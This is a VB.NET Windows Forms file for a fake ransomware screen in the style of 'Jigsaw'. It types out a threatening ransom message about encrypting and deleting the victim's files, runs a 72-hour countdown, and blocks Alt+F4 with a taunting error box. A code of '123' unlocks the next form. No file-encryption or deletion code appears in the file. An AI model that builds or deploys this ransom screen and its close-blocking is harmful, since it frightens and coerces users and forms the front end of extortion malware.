Public Class Form2
    Dim hour As Double = 71
    Dim minute As Double = 59
    Dim second As Double = 59
    Dim i As Integer
    Dim strmsg As String

    Private Sub Form2_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            e.Handled = True
        End If
    End Sub

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label2.Text = hour
        Label4.Text = minute
        strmsg = "I want to play a game with you. Let me explain the rules:" + Environment.NewLine + "Your personal files are being deleted. Your photos, videos, documents, etc..." + Environment.NewLine + "But, don't worry! It will only happen if you don't comply." + Environment.NewLine + "Howeever I've already encrypted your personal files, so you cannot access them." + Environment.NewLine + Environment.NewLine + "Every hour I select some of them to delete permanently," + Environment.NewLine + "therefore I won't be able to access them, either." + Environment.NewLine + "Are you familiar with the concept of exponential growth? Let me help you out." + Environment.NewLine + "It starts out slowly then increases rapidly." + Environment.NewLine + "During the first 24hour you will only lose a few files," + Environment.NewLine + "the second day a few hundred, the third day a few thousand, and so on." + Environment.NewLine + Environment.NewLine + "If you turn off your computer or try to close me, when I start next time" + Environment.NewLine + "you will get 1000 files deleted as a punishment." + Environment.NewLine + "Yes you will want me to start next time, since I am the only one that is capable to " + Environment.NewLine + "decrypt your personal data for you." + Environment.NewLine + "                         Now, let's start and enjoy our little game together!"
        Timer1.Enabled = True
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        i += 1
        Label1.Text += strmsg.Substring(i - 1, 1)
        If i = strmsg.Length Then
            Timer1.Enabled = False
            Timer2.Enabled = True
            Panel1.Visible = True
            Label5.Visible = True
            TextBox1.Visible = True
            TextBox2.Visible = True
            Label6.Visible = True
            Button1.Visible = True
        End If
    End Sub

    

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Label2.Text = hour
        Label4.Text = minute
        'Label3.Text = second
        If minute = 0 Then
            hour = hour - 1
            minute = 59
        ElseIf second = 0 Then
            minute = minute - 1
            second = 59
        Else
            second = second - 1
        End If
    End Sub

    Private Sub Button1_KeyDown(sender As Object, e As KeyEventArgs) Handles Button1.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            e.Handled = True
        End If
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            e.Handled = True
        End If
    End Sub

    Private Sub TextBox2_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox2.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            e.Handled = True
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox2.Text = "123" Then
            Form3.Show()

        End If
    End Sub
End Class